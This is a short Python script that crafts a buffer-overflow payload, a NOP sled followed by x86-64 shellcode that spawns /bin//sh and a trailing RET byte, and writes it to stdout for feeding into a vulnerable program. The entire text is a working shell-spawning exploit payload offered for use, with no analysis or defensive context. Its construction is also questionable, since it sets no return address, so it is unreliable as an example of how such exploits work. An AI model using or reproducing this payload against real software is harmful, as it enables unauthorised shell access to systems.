import sys

# Crafting the exploit payload
payload = b"\x90" * 100  # NOP sled (100 bytes)
payload += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"  # Shellcode
payload += b"\xc3"  # RET instruction

# Write the payload to stdout, which you can use to input into the program
sys.stdout.buffer.write(payload)
